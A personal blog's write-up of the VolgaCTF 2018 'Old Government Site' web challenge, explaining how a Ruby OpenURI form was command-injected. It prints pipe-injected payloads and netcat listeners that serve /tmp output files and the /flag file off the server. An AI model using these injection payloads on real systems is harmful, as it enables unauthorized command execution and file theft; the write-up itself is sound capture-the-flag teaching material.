<html>
<!--        <link rel="stylesheet" href="minimal.css"> -->
<!--	<script src="https://cdn.rawgit.com/google/code-prettify/master/loader/run_prettify.js"></script> -->
<title>Blog</title>
<?php include 'header.html'; ?>
<br>
<br>
<br>
<center>
    <br>
    <br>

    <br>
    <br>
    <h1>$VolgaCTF 2018 Old Government Site (web150)</h1>
    <br>
</center>
<p>
<br>
<br>
<br>

This is my writeup for the Web 150 <a href="https://volgactf.ru/en/quals.html">VolgaCTF 2018 Quals</a> challenge named "Old Government Site".
In this challenge, users are presented with an "old government site" that looks like the following:
<p>
<img src="res/volga/main.png" \>

<p>
Navigating through the site, the user can see that each page essentially changes with a unique page id parameter within the URL.  
<p>
<img src="res/volga/pageid.png"\>
<p>
The page ids aren't really sequential either, so I suspected that there is likely a hidden page somewhere that is not within the original HTML.  I wrote the below snippet in Python to enumerate potential hidden pages: 
<p>
<script src="https://gist.github.com/ehrenb/7cb29914885cd357a15f46e7254e9bdb.js"></script>

<p>
The script found a page with id=18 to be valid, and it appeared to be a garbage pickup registration form.  When entering a valid web page and submitting, you get a "validated" confirmation message:
<p>
<img src="res/volga/18_validated.png"\>
<p>
I figured there's probably some sort of command injection here, where the attacker needed to validate and somehow tack on an extra command to be executed.  When requesting a page that doesn't exist, you get web server error that indicates it's being on run on <a href="https://github.com/sinatra/sinatra">Sinatra</a>, which is written in Ruby.  I googled around to see how HTTP requests were made in Ruby.  <a href="https://ruby-doc.org/stdlib-2.1.0/libdoc/open-uri/rdoc/OpenURI.html">OpenURI</a> ended up being the correct method, and with a quick <a href="https://www.owasp.org/index.php/Ruby_on_Rails_Cheatsheet">search</a> you can see that it is command-injectable. Testing the OR ("| <cmd>") approach, the command is validated, but we still don't get any output: 
<p>
<img src="res/volga/18_lsla_validated.png"\>

<p>
To check to make sure my commands were actually running, I went through the painful process of piping output to files within /tmp and then serving them up using netcat:
<br>
<pre>
| uname > /tmp/uname
| nc -l -p 32533< /tmp/uname 
Linux old-goverment 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
</pre>
<br>
Thankfully, things seemed to be running.  I went one step further, knowing that it was running a recent version of Ubuntu, and started a Python <a href="https://docs.python.org/2/library/simplehttpserver.html">SimpleHTTPServer</a> (which another team ended up using ;) ) and was able to download the app's source code:
<p>
<img src="res/volga/simplehttpserver.png" \>
<br>
Web app source:
<p>
<script src="https://gist.github.com/ehrenb/9bf3c5cdfb9ce5b13e75c3950e52eaf2.js"></script>

<p>
Although it didn't contain the flag, it still validated my command injection approach.  Many injections and netcats later, I found a file named "flag" in the root directory:
<br>
<pre>
| ls -la / > /tmp/root_ls.out
| nc -l -p 32533< /tmp/root_ls.out

drwxr-xr-x  22 root root  4096 Mar 23 19:08 .
drwxr-xr-x  22 root root  4096 Mar 23 19:08 ..
drwxr-xr-x   2 root root  4096 Mar 23 19:05 bin
drwxr-xr-x   3 root root  4096 Mar 23 19:05 boot
drwxr-xr-x  17 root root  3680 Mar 24 18:39 dev
drwxr-xr-x  95 root root  4096 Mar 24 18:39 etc
-rw-r--r--   1 root root    41 Mar 23 19:37 flag
drwxr-xr-x   2 root root  4096 Apr 13  2016 home
lrwxrwxrwx   1 root root    33 Mar 16 19:01 initrd.img -> boot/initrd.img-4.4.0-116-generic
drwxr-xr-x  20 root root  4096 Mar 16 19:03 lib
drwxr-xr-x   2 root root  4096 Mar 16 19:02 lib64
drwx------   2 root root 16384 Mar 16 19:00 lost+found
drwxr-xr-x   2 root root  4096 Mar 16 19:00 media
drwxr-xr-x   2 root root  4096 Mar 16 19:00 mnt
drwxr-xr-x   3 root root  4096 Mar 23 19:37 opt
dr-xr-xr-x 397 root root     0 Mar 24 18:39 proc
drwx------   7 root root  4096 Mar 23 20:18 root
drwxr-xr-x  18 root root   580 Mar 24 18:40 run
drwxr-xr-x   2 root root  4096 Mar 23 19:05 sbin
drwxr-xr-x   2 root root  4096 Mar 16 19:00 srv
dr-xr-xr-x  13 root root     0 Mar 24 19:25 sys
drwxrwxrwt   8 root root  4096 Mar 25 08:56 tmp
drwxr-xr-x  10 root root  4096 Mar 16 19:00 usr
drwxr-xr-x  11 root root  4096 Mar 16 19:00 var
lrwxrwxrwx   1 root root    30 Mar 16 19:01 vmlinuz -> boot/vmlinuz-4.4.0-116-generic

| nc -l -p 32533< /flag
</pre>
<img src="res/volga/flag.png"\>

</center>


</p>

</html>
